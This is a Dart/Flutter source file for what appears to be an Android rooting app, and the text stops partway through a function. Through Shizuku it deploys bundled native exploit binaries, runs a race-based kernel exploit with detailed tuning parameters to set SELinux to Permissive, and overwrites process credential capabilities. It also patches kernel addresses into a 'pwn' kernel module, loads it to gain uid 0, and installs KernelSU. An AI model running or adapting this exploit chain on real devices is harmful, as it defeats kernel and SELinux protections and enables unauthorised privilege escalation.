import 'dart:async';
import 'dart:io' show IOSink;
import 'dart:convert';
import 'dart:io' show File, FileMode, gzip;
import 'dart:typed_data';
import 'dart:math';

import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart' show rootBundle;

import 'calib.dart';
import 'shizuku.dart';

enum StageId { env, permissive, probe, phase1, phase2, root, ksu, verify }

const Map<StageId, String> stageTitles = {
  StageId.env: '环境检查 · 部署资产',
  StageId.permissive: '① SELinux → Permissive',
  StageId.probe: '② 候选进程捕获 cred',
  StageId.phase1: '③ 零写 cap_bset',
  StageId.phase2: '④ 指针写 cap_effective',
  StageId.root: '⑤ 加载模块 → uid=0',
  StageId.ksu: '⑥ 补丁 + 加载 KernelSU',
  StageId.verify: '⑦ su 验证 · 跳转',
};

enum StageStatus { pending, running, ok, failed, skipped }

class StageState {
  final StageId id;
  StageStatus status = StageStatus.pending;
  int tries = 0; // 竞态尝试次数（from stage_done）
  int hits = 0; // 命中次数
  int runs = 0; // 发起轮数
  String detail = '';

  StageState(this.id);

  String get title => stageTitles[id] ?? id.name;
  double get rate => tries == 0 ? 0 : hits / tries;
  bool get hasRate => tries > 0;
}

class RootChain extends ChangeNotifier {
  static const String workDir = '/data/local/tmp/rk';
  final Calibration calib = Calibration();

  /// selinux 零写目标（由校准推出的直映射别名）
  String get selinuxAlias => calib.selinuxAliasHex;

  final List<StageState> stages =
      StageId.values.map((e) => StageState(e)).toList();
  final List<String> logs = [];
  final List<String> suggestions = [];

  bool running = false;
  bool shizukuOk = false;
  bool success = false;        // su 验证通过（整链成功）
  bool softRebootTried = false;
  final Map<String, String> _orig = {};  // 选项改动前的系统原值快照
  bool _optApplied = false;
  String bootId = '';
  String phase = '空闲';
  String? lastError;
  final Map<String, String> health = {}; // temp/wake/mem/posix/cred/enforce
  final Map<StageId, String> skipReason = {};  // 可跳过的阶段 → 原因
  bool alreadyRooted = false;                 // 探测到已越狱（su 可用）
  bool assetsReady = false;                   // 资产已在设备上（跳过重复写入）
  String devState = '';                        // 一句话设备现状（用于界面）
  String shizukuVia = '';

  // ---- 可选项（持久化在 App 私有 SharedPreferences）----
  bool optWifiOff = false;   // 关 WiFi / 蓝牙 / 飞行模式（提高命中率，但会让 Shizuku 无线调试失效）
  bool optTap = true;        // 每轮自动点屏（防止 doze 导致命中率归零）
  bool optStayOn = true;     // 保持屏幕常亮
  bool optCleanup = true;    // 成功后清理已落盘的原生件与临时文件

  Future<void> loadOptions() async {
    final a = await ShizukuShell.getPref('opt.wifiOff');
    final b = await ShizukuShell.getPref('opt.tap');
    final c = await ShizukuShell.getPref('opt.stayOn');
    final d = await ShizukuShell.getPref('opt.cleanup');
    if (a != null) optWifiOff = a == '1';
    if (b != null) optTap = b == '1';
    if (c != null) optStayOn = c == '1';
    if (d != null) optCleanup = d == '1';
    notifyListeners();
  }

  Future<void> setOptions({bool? wifiOff, bool? tap, bool? stayOn, bool? cleanup}) async {
    if (wifiOff != null) {
      optWifiOff = wifiOff;
      await ShizukuShell.setPref('opt.wifiOff', wifiOff ? '1' : '0');
    }
    if (tap != null) {
      optTap = tap;
      await ShizukuShell.setPref('opt.tap', tap ? '1' : '0');
    }
    if (stayOn != null) {
      optStayOn = stayOn;
      await ShizukuShell.setPref('opt.stayOn', stayOn ? '1' : '0');
    }
    if (cleanup != null) {
      optCleanup = cleanup;
      await ShizukuShell.setPref('opt.cleanup', cleanup ? '1' : '0');
    }
    _advice();
    notifyListeners();
  }

  /// 记录被选项影响的系统设置原值（只记第一次，避免把自己改过的值当原值）
  Future<void> _snapshotOptions() async {
    if (_optApplied) return;
    final r = await ShizukuShell.run(
        r'echo T=$(settings get system screen_off_timeout);'
        r'echo S=$(settings get global stay_on_while_plugged_in);'
        r'echo A=$(settings get global airplane_mode_on);'
        r'echo W=$(settings get global wifi_on);'
        r'echo B=$(settings get global bluetooth_on)');
    for (final line in r.out.split('\n')) {
      final i = line.indexOf('=');
      if (i <= 0) continue;
      final k = line.substring(0, i).trim();
      final v = line.substring(i + 1).trim();
      if ('TSAWB'.contains(k) && v.isNotEmpty && v != 'null') _orig[k] = v;
    }
    _optApplied = true;
    _log('[env] 已记录原设置：屏幕超时=${_orig['T']} 常亮=${_orig['S']} '
        '飞行=${_orig['A']} wifi=${_orig['W']} bt=${_orig['B']}');
  }

  /// 把选项改动过的系统设置恢复到运行前的状态
  Future<void> restoreOptions() async {
    if (!_optApplied) return;
    final b = StringBuffer();
    final t = _orig['T'];
    if (optStayOn && t != null && t != 'null') {
      b.write('settings put system screen_off_timeout $t; ');
      final s0 = _orig['S'];
      if (s0 != null) b.write('settings put global stay_on_while_plugged_in $s0; ');
    }
    if (optWifiOff) {
      final a = _orig['A'];
      if (a != null) {
        b.write('settings put global airplane_mode_on $a; ');
        b.write('am broadcast -a android.intent.action.AIRPLANE_MODE --ez state '
            '${a == '1' ? 'true' : 'false'} >/dev/null 2>&1; ');
      }
      final w = _orig['W'];
      if (w != null) b.write('svc wifi ${w == '1' ? 'enable' : 'disable'}; ');
      final bt = _orig['B'];
      if (bt != null) b.write('svc bluetooth ${bt == '1' ? 'enable' : 'disable'}; ');
    }
    if (b.isEmpty) return;
    b.write('true');
    final r = await ShizukuShell.run(b.toString());
    _log('[env] 已恢复原设置（屏幕超时/常亮/飞行/WiFi/蓝牙）rc=${r.code}');
    _optApplied = false;
  }

  /// 开局前按开关拼命令（不再强制关 WiFi）
  String _prepCmd() {
    // 首次应用前先记录原值（异步，不阻塞；快照失败就跳过恢复）
    if (!_optApplied) {
      // ignore: discarded_futures
      _snapshotOptions();
    }
    final b = StringBuffer();
    if (optTap) b.write('input keyevent 224; input tap 540 1200; ');
    if (optStayOn) {
      b.write('svc power stayon true; settings put system screen_off_timeout 1800000; ');
    }
    if (optWifiOff) {
      b.write('svc wifi disable; svc bluetooth disable; settings put global airplane_mode_on 1; '
          'am broadcast -a android.intent.action.AIRPLANE_MODE --ez state true >/dev/null 2>&1; ');
    }
    b.write('true');
    return b.toString();
  }

  Map<StageId, StageState> get _byId => {for (final s in stages) s.id: s};

  bool _stop = false;
  Timer? _heartbeat;

  static const Map<StageId, String> _prefKey = {
    StageId.permissive: 's0',
    StageId.phase1: 'p1',
    StageId.phase2: 'p2',
  };

  // ---------------------------------------------------------------- 日志

  File? _logFile;
  final StringBuffer _pending = StringBuffer();
  Timer? _flushTimer;

  /// 日志同时写盘（App 私有目录），这样设备 panic 重启后还能看到上次运行过程
  Future<void> initLogFile() async {
    final dir = await ShizukuShell.filesDir();
    if (dir.isEmpty) return;
    _logFile = File('$dir/app.log');
    try {
      if (await _logFile!.exists() && await _logFile!.length() > 512 * 1024) {
        await _logFile!.delete();
      }
    } catch (_) {}
  }

  /// 校准弹窗用：走统一日志管道（批量化落盘 + 800 行裁剪）
  void addLogFromCalib(String l) => _log('[calib] $l');

  void _flushLog() {
    final f = _logFile;
    if (f == null || _pending.isEmpty) return;
    final text = _pending.toString();
    _pending.clear();
    try {
      f.writeAsStringSync(text, mode: FileMode.append, flush: false);
    } catch (_) {}
  }

  /// 把缓存刷盘（阶段结束 / App 退到后台时调用）
  void flushLog() {
    _flushTimer?.cancel();
    _flushTimer = null;
    _flushLog();
  }

  /// 读取上次运行的日志（重启后查看用）
  Future<List<String>> loadPrevLog() async {
    if (_logFile == null) await initLogFile();
    final f = _logFile;
    if (f == null) return const [];
    try {
      if (!await f.exists()) return const [];
      final text = await f.readAsString();
      final lines = text.split('\n').where((e) => e.trim().isNotEmpty).toList();
      if (lines.length <= 300) return lines;
      return lines.sublist(lines.length - 300);
    } catch (_) {
      return const [];
    }
  }

  void _log(String s) {
    if (s.isEmpty) return;
    final lines = s.split('\n');
    final buf = StringBuffer();
    for (final l in lines) {
      if (l.trim().isEmpty) continue;
      final t = l.length > 400 ? '${l.substring(0, 400)}…' : l;
      logs.add(t);
      buf.writeln(t);
    }
    if (logs.length > 800) logs.removeRange(0, logs.length - 800);
    final f = _logFile;
    if (f != null && buf.isNotEmpty) {
      _pending.write(buf);
      _flushTimer ??= Timer(const Duration(milliseconds: 250), () {
        _flushTimer = null;
        _flushLog();
      });
    }
    notifyListeners();
  }

  void _stage(StageId id, StageStatus st, {String? detail}) {
    final s = _byId[id]!;
    s.status = st;
    if (detail != null) s.detail = detail;
    notifyListeners();
  }

  void _advice() {
    suggestions.clear();
    final env = _byId[StageId.env]!;
    final perm = _byId[StageId.permissive]!;
    final p1 = _byId[StageId.phase1]!;
    final p2 = _byId[StageId.phase2]!;
    final ksu = _byId[StageId.ksu]!;

    if (alreadyRooted) {
      suggestions.add('设备已越狱：可直接点「KernelSU」打开管理面板；如需撤销，右上角「重启」正常重启即可。');
      return;
    }
    if (!shizukuOk) {
      suggestions.add('先授权 Shizuku（打开 Shizuku → 无线调试启动 → 回到本页点「授权」）。');
    }
    if (perm.status == StageStatus.failed) {
      suggestions.add('permissive 连续未命中：确认屏幕常亮、关 WiFi / 开飞行模式、机身不烫（>60°C 会降频）。');
    } else if (perm.hasRate && perm.rate < 0.4) {
      suggestions.add('permissive 命中率 ${(perm.rate * 100).toStringAsFixed(0)}% 偏低：每轮前会点屏，建议重启设备后再跑。');
    }
    if (p1.status == StageStatus.failed || p2.status == StageStatus.failed) {
      suggestions.add('cred 写未落地：命中率会随尝试次数下降，重启设备后重跑通常更稳（本页可继续点开始）。');
    }
    if (ksu.status == StageStatus.failed) {
      suggestions.add('KSU 加载失败：看日志里 ksupatch / ml2 的报错；模板与内核版本必须匹配。');
    }
    if (env.status == StageStatus.failed) {
      suggestions.add('资产部署失败：确认 Shizuku 在线、/data/local/tmp 可写。');
    }
    final t = int.tryParse(health['T'] ?? '');
    if (t != null && t > 45000) {
      suggestions.add('机身偏热（${(t / 1000).toStringAsFixed(1)}°C）：CPU 会降频、命中率明显下降，建议停一会儿降温。');
    }
    if ((health['W'] ?? '').isNotEmpty && health['W'] != 'Awake') {
      suggestions.add('屏幕不在唤醒状态（${health['W']}）：命中和 rnd 会掉，App 每轮会自动点屏。');
    }
    if (health['E'] == 'Permissive') {
      suggestions.add('当前是 Permissive：SELinux context 已被打坏，'
          '若中断请点右上角「重启」做正常重启（比 panic 重启黑屏时间短）。');
    }
    if (optWifiOff) {
      suggestions.add('已开启「关 WiFi/蓝牙」：命中率更高，但重启后要重新打开 WiFi、'
          '重新开启开发者选项里的「无线调试」才能启动 Shizuku（或用电脑 adb 启动）。');
    }
    if (suggestions.isEmpty) {
      suggestions.add(running ? '正在执行，保持屏幕常亮；单轮约 3–5 分钟。' : '点「开始越狱」：先拿 root，再自动装 KernelSU。');
    }
    notifyListeners();
  }

  // ---------------------------------------------------------------- 小工具

  int _seq = 0;
  String _ts() {
    final d = DateTime.now();
    _seq = (_seq + 1) % 10000;
    return '${d.hour.toString().padLeft(2, '0')}${d.minute.toString().padLeft(2, '0')}'
        '${d.second.toString().padLeft(2, '0')}_${d.millisecond.toString().padLeft(3, '0')}'
        '$_seq';
  }

  static final BigInt _u64 = BigInt.one << 64;

  /// 内核地址一律用 BigInt：0xffff... 超过 int64 上限，用 int 会 FormatException
  String _hex(BigInt v) =>
      '0x${(v & (_u64 - BigInt.one)).toRadixString(16)}';

  BigInt _fromHex(String s) {
    final t = s.startsWith('0x') || s.startsWith('0X') ? s.substring(2) : s;
    return BigInt.parse(t, radix: 16);
  }

  static String _shq(String s) => "'${s.replaceAll("'", "'\\''")}'";

  /// 把 px2_mod.c 里"恢复 selinux.initialized"用的 4 条 movz/movk 常量，
  /// 按校准得到的别名就地重写（原始常量 = 本机型默认别名）。
  Uint8List _patchModuleAlias(Uint8List src, String aliasHex) {
    // 内核地址超出 int64 上限，必须用 BigInt（否则 FormatException）
    final wantBig = BigInt.parse(aliasHex.substring(2), radix: 16) | BigInt.one;
    // 原始编译常量（pwn_mod.c 里 movz/movk 拼出的值）
    final origBig = BigInt.parse('ffffff8049fe7a61', radix: 16);
    if (wantBig == origBig) return src;
    // 后续按 16 位分片编码，用 BigInt 取位，避免任何 int 溢出
    int part(BigInt v, int shift) =>
        ((v >> shift) & BigInt.from(0xffff)).toInt();

    int movz(int imm, int rd) => 0xD2800000 | ((imm & 0xffff) << 5) | rd;
    int movk(int imm, int hw, int rd) =>
        0xF2800000 | ((hw & 3) << 21) | ((imm & 0xffff) << 5) | rd;

    List<int> enc(BigInt v) {
      final b = BytesBuilder();
      void put(int w) {
        b.add([w & 0xff, (w >> 8) & 0xff, (w >> 16) & 0xff, (w >> 24) & 0xff]);
      }
      put(movz(part(v, 0), 3));
      put(movk(part(v, 16), 1, 3));
      put(movk(part(v, 32), 2, 3));
      put(movk(part(v, 48), 3, 3));
      return b.toBytes();
    }

    final from = enc(origBig);
    final to = enc(wantBig);
    final out = Uint8List.fromList(src);
    var patched = 0;
    for (var i = 0; i + 16 <= out.length; i++) {
      var hit = true;
      for (var j = 0; j < 16; j++) {
        if (out[i + j] != from[j]) {
          hit = false;
          break;
        }
      }
      if (hit) {
        for (var j = 0; j < 16; j++) {
          out[i + j] = to[j];
        }
        patched++;
      }
    }
    _log('[env] module.ko 别名改写：${from.length}B 指令块 ×$patched → ${aliasHex}');
    return out;
  }

  /// 模块名唯一化：把 .modinfo / __this_module.name 里的 "pwn4" 换成 "pwnX"
  /// 这样同一个 boot 里重复跑也能再加载一次（不同名）
  Uint8List _uniqueModuleName(Uint8List src) {
    const from = 'pwn4';
    final rnd = 'abcdefghijklmnopqrstuvwxyz0123456789'[Random().nextInt(36)];
    final to = 'pwn$rnd';
    final out = Uint8List.fromList(src);
    for (var i = 0; i + from.length <= out.length; i++) {
      var ok = true;
      for (var j = 0; j < from.length; j++) {
        if (out[i + j] != from.codeUnitAt(j)) {
          ok = false;
          break;
        }
      }
      if (ok) {
        for (var j = 0; j < to.length; j++) {
          out[i + j] = to.codeUnitAt(j);
        }
      }
    }
    return out;
  }

  Future<String> _bootId() async {
    final r = await ShizukuShell.run('cat /proc/sys/kernel/random/boot_id 2>&1');
    if (r.out.trim().isEmpty) _log('[env] boot_id 读取异常: rc=${r.code} ${r.all}');
    return r.out.trim();
  }

  Future<void> _sleep(int ms) async {
    final end = DateTime.now().add(Duration(milliseconds: ms));
    while (!_stop && DateTime.now().isBefore(end)) {
      await Future.delayed(const Duration(milliseconds: 200));
    }
  }

  /// 解析 exploit 日志里的 stage_done 行：统计 try/hit
  /// 统计 stage_done；st==0 归 permissive，st==1 归调用方指定的阶段（③ 或 ④）
  void _countTries(String logText, {StageId phase1OrPhase2 = StageId.phase1}) {
    final re = RegExp(r'stage_done st=(\d) try=(\d+) leak=(0x[0-9a-fA-F]+|0)');
    for (final m in re.allMatches(logText)) {
      final st = int.parse(m.group(1)!);
      final leak = m.group(3)!;
      final id = st == 0 ? StageId.permissive : phase1OrPhase2;
      final s = _byId[id]!;
      s.tries += 1;
      if (leak != '0') s.hits += 1;
    }
  }

  List<BigInt> _parseCreds(String probeLog) {
    final re = RegExp(r'CAND idx=\d+ pid=\d+ CRED=(0x[0-9a-fA-F]+) bit16=(\d)');
    final out = <BigInt>[];
    for (final m in re.allMatches(probeLog)) {
      final v = _fromHex(m.group(1)!);
      final b16 = int.parse(m.group(2)!);
      // bit16=1 优先，放前面
      if (b16 == 1) {
        out.insert(0, v);
      } else {
        out.add(v);
      }
    }
    return out;
  }

  // ---------------------------------------------------------------- 主流程

  Future<void> start() async {
    if (running) return;
    running = true;
    _stop = false;
    lastError = null;
    for (final s in stages) {
      s.status = StageStatus.pending;
      s.detail = '';
    }
    logs.clear();
    success = false;
    await initLogFile();
    // 校准在「环境检查」完成资产部署之后执行（见 _runEnv 末尾），届时 koquery/BTF 已就位    _log('===== 新会话 ${DateTime.now().toString().substring(0, 19)} =====');
    _loadStats();
    _advice();
    notifyListeners();

    // 心跳：更新耗时/保持屏幕
    _heartbeat = Timer.periodic(const Duration(seconds: 20), (_) async {
      if (!running) return;
      await ShizukuShell.run(_prepCmd());
      await refreshHealth();
    });

    try {
      bootId = await _bootId();
      await _snapshotOptions();   // 先记录原值，运行结束/成功后可原样恢复
      await refreshHealth();
      // 探测现状（决定哪些阶段可直接跳过）
      try {
        await detectStatus();
      } catch (e) {
        _log('[status] 探测失败：$e');
      }
      for (final e in skipReason.entries) {
        _stage(e.key, StageStatus.skipped, detail: e.value);
      }
      if (alreadyRooted) {
        success = true;
        phase = '已越狱成功（无需操作）';
        _log('[verify] su 已可用：设备已越狱，本次不执行任何步骤');
        notifyListeners();
        return;   // finally 仍会收尾
      }

      Future<void> guarded(StageId id, Future<void> Function() fn,
          {required StageId next}) async {
        if (_stop || _byId[id]!.status == StageStatus.failed) return;
        if (_byId[id]!.status == StageStatus.skipped) {
          _log('[${id.name}] 跳过：${skipReason[id] ?? "已满足"}');
          return;
        }
        try {
          await fn();
        } catch (e) {
          _log('[${id.name}] 异常: $e');
          _stage(id, StageStatus.failed, detail: '$e');
          lastError = '$e';
        }
        // 函数正常返回但没置 ok/ failed（例如中途 _stop）⇒ 不能静默停在 pending
        if (!_stop && _byId[id]!.status == StageStatus.pending) {
          _stage(id, StageStatus.failed, detail: '未完成');
          lastError = '${_byId[id]!.title} 未完成';
        }
      }

      await guarded(StageId.env, _runEnv, next: StageId.permissive);
      if (!_stop && statusOkOrSkipped(StageId.env)) {
        await guarded(StageId.permissive, _runPermissive,
            next: StageId.probe);
      }
      if (!_stop && (statusOkOrSkipped(StageId.permissive))) {
        await guarded(StageId.probe, _runProbe, next: StageId.phase1);
      }
      if (!_stop && (statusOkOrSkipped(StageId.probe))) {
        await guarded(StageId.phase1, _runPhase1, next: StageId.phase2);
      }
      if (!_stop && (statusOkOrSkipped(StageId.phase1))) {
        await guarded(StageId.phase2, _runPhase2, next: StageId.root);
      }
      if (!_stop && (statusOkOrSkipped(StageId.phase2))) {
        await guarded(StageId.root, _runRoot, next: StageId.ksu);
      }
      if (!_stop && (statusOkOrSkipped(StageId.root))) {
        await guarded(StageId.ksu, _runKsu, next: StageId.verify);
      }
      if (!_stop && (statusOkOrSkipped(StageId.ksu))) {
        await guarded(StageId.verify, _runVerify, next: StageId.verify);
      }
    } catch (e, st) {
      lastError = '$e';
      _log('EXCEPTION: $e');
      _log('$st');
    } finally {
      _heartbeat?.cancel();
      _heartbeat = null;
      if (success) {
        phase = '越狱成功';
      } else if (_stop) {
        phase = '已停止';
      } else if (allDoneOrSkipped) {
        phase = '已完成（含跳过）';
      }
      running = false;
      _saveStats();
      _advice();
      notifyListeners();
    }
  }

  Future<void> stop() async {
    _stop = true;
    phase = '正在停止…';
    notifyListeners();
    // 注意：不能用 `pkill -f x645` —— 会匹配到承载它的 `sh -c` 自身，导致后续 pkill 不执行，
    // pc/pc_run 存活并继续占用 perf fd、污染下一轮。用 -x 精确匹配进程名，并拆成多条独立命令。
    await ShizukuShell.run('pkill -x x645');
    await ShizukuShell.run('pkill -x pc');
    await ShizukuShell.run('pkill -f "[p]c_run"');
    await ShizukuShell.run('rm -f $workDir/probe.log');
    _log('[stop] 已清理 x645 / pc');
  }

  // ---------------------------------------------------------------- 各阶段

  Future<void> _runEnv() async {
    _stage(StageId.env, StageStatus.running, detail: '检查 Shizuku…');
    phase = '环境检查';
    shizukuOk = await ShizukuShell.checkPermission();
    if (!shizukuOk) {
      shizukuOk = await ShizukuShell.requestPermission();
    }
    if (!shizukuOk) {
      _stage(StageId.env, StageStatus.failed, detail: 'Shizuku 未授权');
      lastError = 'Shizuku 未授权';
      _advice();
      _stop = true;
      return;
    }
    _log('[env] Shizuku OK, boot_id=$bootId');
    _stage(StageId.env, StageStatus.running, detail: '部署资产…');

    // 755：属主是 shell（可写），其他 App 不可替换（否则任何 App 都能替换 ksupatch/ksu_template 实现提权）
    final r = await ShizukuShell.run('mkdir -p $workDir && chmod 755 $workDir && echo MKDIR_OK');
    _log('[env] mkdir rc=${r.code} ${r.all}');
    if (r.code != 0 || !r.out.contains('MKDIR_OK')) {
      _stage(StageId.env, StageStatus.failed, detail: '目录不可写');
      return;
    }
    // 原生件在 APK 里以 gzip 存放（省 ~2MB 体积），部署时解压
    const assets = {
      'assets/x645.gz': 'x645',
      'assets/pc.gz': 'pc',
      'assets/module.ko': 'module.ko',
      'assets/ml2.gz': 'ml2',
      'assets/ksupatch.gz': 'ksupatch',
      'assets/ksu_template.ko.gz': 'ksu_template.ko',
      'assets/koquery.gz': 'koquery',
      'assets/kallsyms_6.12.58.bin.gz': 'ksyms.bin.gz',
    };
    for (final e in assets.entries) {
      if (_stop) return;
      try {
        final data = await rootBundle.load(e.key);
        var bytes = data.buffer.asUint8List();
        if (e.key.endsWith('.gz')) {
          bytes = Uint8List.fromList(gzip.decode(bytes));
        }
        if (e.value == 'module.ko') {
          bytes = _uniqueModuleName(bytes);
          try {
            bytes = _patchModuleAlias(bytes, calib.selinuxAliasHex);
          } catch (e) {
            // 别名改写是非必需步骤（模块内置本机型常量）；失败不应阻断整链
            _log('[env] 模块别名改写失败（改用内置常量）：$e');
          }
        }
        // 资产已在位且大小一致 ⇒ 不重复写（慢链路下省时间；校准仍会跑）
        if (assetsReady) {
          final st = await ShizukuShell.run(
              'wc -c < $workDir/${e.value} 2>/dev/null || echo 0');
          final have = int.tryParse(RegExp(r'\d+').firstMatch(st.out)?.group(0) ?? '') ?? 0;
          if (have == bytes.length) {
            _log('[env] ${e.value} 已存在（${(bytes.length / 1024).toStringAsFixed(0)}KB）跳过写入');
            continue;
          }
        }
        final w = await ShizukuShell.run(
          'cat > $workDir/${e.value} && chmod 755 $workDir/${e.value} && '
          'wc -c < $workDir/${e.value} && echo SIZE_END',
          stdin: bytes,
          timeoutMs: 180000,
        );
        final szm = RegExp(r'(\d+)\s*SIZE_END').firstMatch(w.out);
        final wroteOk = szm != null && int.tryParse(szm.group(1)!) == bytes.length;
        if (w.code != 0 || !wroteOk) {
          _stage(StageId.env, StageStatus.failed, detail: '写入 ${e.value} 失败');
          _log('[env] ${e.value}: rc=${w.code} 期望 ${bytes.length}B 实际 ${szm?.group(1) ?? "?"}B ${w.all}');
          return;
        }
        _log('[env] ${e.value} ✓ (${(bytes.length / 1024).toStringAsFixed(0)}KB)');
      } catch (ex) {
        _stage(StageId.env, StageStatus.failed, detail: 'asset ${e.key} 读取失败');
        _log('[env] $ex');
        return;
      }
    }
    // ★ 资产已就位（koquery 可执行），此时再校准：CRC / BTF / iomem 才拿得到
    await _ensureCalibrated();

    if (!calib.kernelKnown) {
      _stage(StageId.env, StageStatus.failed,
          detail: '未知内核：${calib.kernelVersion}（需手填物理基址或提供 boot.img）');
      lastError = '未知内核 ${calib.kernelVersion}：请到 选项→校准→「手填物理基址」'
          '填入该内核的物理基址（或提供 boot.img 推导），确认后再运行';
      _stop = true;
      _advice();
      return;
    }
    _stage(StageId.env, StageStatus.ok,
        detail: '资产已部署 · 内核 ${calib.kernelVersion}（${_kernelSourceText()}）');
    _advice();
  }

  /// 自上而下探测设备现状：先从“最终目标”往回判，命中就一路跳过前面的步骤。
  Future<void> detectStatus() async {
    skipReason.clear();
    alreadyRooted = false;
    final r = await ShizukuShell.run(
        r'echo ENF=$(getenforce 2>/dev/null);'
        r' echo KSU=$(grep -c "^kernelsu" /proc/modules 2>/dev/null || echo 0);'
        r' echo MODS=$(grep -cE "^(pwnm|pwn3|pwnf)" /proc/modules 2>/dev/null || echo 0);'
        r' echo ASSET=$(ls /data/local/tmp/rk/x645 /data/local/tmp/rk/pc /data/local/tmp/rk/ksupatch /data/local/tmp/rk/ml2 2>/dev/null | wc -l);'
        r' echo SUC=$(timeout 4 su -c id -u 2>/dev/null | tr -dc 0-9 | head -c 1);'
        r' echo UID=$(id -u)');
    final m = <String, String>{};
    for (final line in r.out.split('\n')) {
      final i = line.indexOf('=');
      if (i > 0) m[line.substring(0, i).trim()] = line.substring(i + 1).trim();
    }
    final enf = m['ENF'] ?? '';
    final ksu = int.tryParse(m['KSU'] ?? '0') ?? 0;
    final mods = int.tryParse(m['MODS'] ?? '0') ?? 0;
    final asset = int.tryParse(m['ASSET'] ?? '0') ?? 0;
    final suc = (m['SUC'] ?? '') == '0';

    // ① 终局：su 已可用 ⇒ 已经越狱，整条链一步都不用跑
    if (suc) {
      alreadyRooted = true;
      for (final id in StageId.values) {
        skipReason[id] = '已越狱（su 可用），无需操作';
      }
      devState = '已越狱 · su 可用 · KSU ${ksu > 0 ? "已加载" : "未加载"}';
      phase = '已越狱成功（无需操作）';
      _log('[status] $devState');
      _log('[status] 已越狱：全部阶段视为完成');
      for (final id in StageId.values) {
        _stage(id, StageStatus.skipped, detail: '已越狱（su 可用）');
      }
      _advice();
      notifyListeners();
      return;
    }

    // ② 有 root 模块但 KSU 未加载 ⇒ 从 ⑥ 起（①–⑤ 全部满足）
    if (mods > 0 && ksu == 0) {
      for (final id in const [
        StageId.env,
        StageId.permissive,
        StageId.probe,
        StageId.phase1,
        StageId.phase2,
        StageId.root,
      ]) {
        skipReason[id] = '已有 root 模块（pwn*）在运行';
      }
    }

    // ③ 单项满足即可跳过
    if (enf == 'Permissive' && !skipReason.containsKey(StageId.permissive)) {
      skipReason[StageId.permissive] = 'SELinux 已是 Permissive';
    }
    assetsReady = asset >= 4;   // 资产已在位：_runEnv 里跳过重复写入，但校准照跑
    if (mods > 0 && ksu == 0) {
      for (final id in const [
        StageId.env,
        StageId.permissive,
        StageId.probe,
        StageId.phase1,
        StageId.phase2,
        StageId.root,
      ]) {
        _stage(id, StageStatus.skipped, detail: '已有 root 模块（pwn*）');
      }
      phase = '已有 root，待加载 KernelSU';
    }
    if (ksu > 0) {
      skipReason[StageId.ksu] = 'KernelSU 已加载';
      if (skipReason.containsKey(StageId.root)) {
        skipReason[StageId.root] = '已有 root 模块在运行（kernelsu 已加载）';
      }
    }

    devState = [
      'SELinux=$enf',
      if (ksu > 0) 'KSU 已加载' else if (mods > 0) 'root 模块已加载 · KSU 未加载' else 'KSU 未加载',
      'su 不可用',
      '资产 $asset/4',
    ].join(' · ');
    _log('[status] $devState');
    if (skipReason.isNotEmpty) {
      _log('[status] 可跳过：${skipReason.keys.map((k) => k.name).join("、")}');
    }
    notifyListeners();
  }

  /// 校准（若需要）：首次 / 换 boot / 有失败项；本 boot 已校准则直接跳过
  Future<void> _ensureCalibrated() async {
    try {
      final saved = await Calibration.load();
      calib.applyFrom(saved);
      final curBoot =
          (await ShizukuShell.run('cat /proc/sys/kernel/random/boot_id')).out.trim();
      final need = calib.vermagic.isEmpty ||
          calib.items.isEmpty ||
          (saved.bootId.isNotEmpty && curBoot.isNotEmpty && saved.bootId != curBoot) ||
          calib.items.any((e) => !e.ok);
      if (!need) {
        _log('[calib] 使用已保存校准（同 boot）：内核=${calib.kernelVersion} '
            'phys=0x${calib.physBase.toRadixString(16)} alias=${calib.selinuxAliasHex}');
        return;
      }
      _log(calib.vermagic.isEmpty ? '[calib] 首次运行，自动校准…' : '[calib] 需要重新校准…');
      await calib.detect(log: _log);
      final bad = calib.items.where((e) => !e.ok).length;
      _log('[calib] 内核=${calib.kernelVersion} 基址来源=${_kernelSourceText()} '
          'phys=0x${calib.physBase.toRadixString(16)} alias=${calib.selinuxAliasHex}');
      _log('[calib] 完成：${calib.items.length - bad}/${calib.items.length} 项通过'
          '${bad > 0 ? "（失败项见 选项→重新校准）" : ""}');
    } catch (e) {
      _log('[calib] 校准异常（用默认值）：$e');
    }
  }

  /// 所有阶段是否都处于「完成或已满足跳过」——用于界面显示完成态
  bool get allDoneOrSkipped => stages.every((s) =>
      s.status == StageStatus.ok || s.status == StageStatus.skipped);

  bool statusOkOrSkipped(StageId id) {
    final st = _byId[id]!.status;
    return st == StageStatus.ok || st == StageStatus.skipped;
  }

  String _kernelSourceText() {
    switch (calib.kernelSource) {
      case 'builtin':
        return '内置记录';
      case 'custom':
        return '自定义记录';
      case 'iomem':
        return 'iomem 探测';
      default:
        return '未知';
    }
  }

  Future<void> _runPermissive() async {
    final s = _byId[StageId.permissive]!;
    _stage(StageId.permissive, StageStatus.running);
    phase = 'permissive';
    for (var run = 0; run < 4 && !_stop; run++) {
      s.runs++;
      await ShizukuShell.run(_prepCmd());
      final logPath = '$workDir/s0_${_ts()}.log';
      final env = 'P645_STAGE=1 P645_STAGE_FROM=0 P645_STAGE_TO=1 P645_STAGE_TRIES=4 P645_ATTEMPTS=1 '
          'P645_KIDS=0 P645_CRED_FARM=0 P645_DRAIN_AFTER=0 P645_THREAD_FILL=0 P645_FILL_SELF=0 '
          'P645_LEAK_FORK=0 P645_FORK_AFTER=0 P645_PRE_UM_MB=0 P645_TIMERS=54000 P645_REPEATS=520 '
          'P645_NDEL=7 P645_DEL_RUN_MS=2500 P645_CONC=1 P645_ANON_MB=8 P645_FREEZE=1 P645_V8=1 '
          'P645_DRAIN_WAIT_MS=25000 P645_PIPE512=64 P645_SOCKS=64 P645_SOCK_MB=8 P645_UHID=0 '
          'P645_MODE=4 P645_ANON2_MB=1024 P645_PIPE_DRAIN=1 P645_PIPE_K=4 P645_SCAN_STOP=1 '
          'P645_THRESH=32 P645_RING_GO=0 P645_FORCE_LEFT=$selinuxAlias P645_LOG=$logPath';
      _log('[permissive] run ${run + 1}: 开打（约 30–60s）');
      final r = await ShizukuShell.run(
        'cd $workDir && chmod 755 x645 && $env ./x645 2>&1; echo "RC=\$?"',
        timeoutMs: 300000,
      );
      _log(r.all);
      final lg = await ShizukuShell.run('cat $logPath 2>/dev/null');
      _countTries(lg.out);
      final enf = await ShizukuShell.run('getenforce');
      if (enf.out.trim() == 'Permissive') {
        s.hits = s.hits == 0 ? 1 : s.hits;
        _stage(StageId.permissive, StageStatus.ok, detail: '已 permissive');
        _advice();
        return;
      }
      if (await _rebooted()) {
        _stage(StageId.permissive, StageStatus.failed, detail: '设备重启');
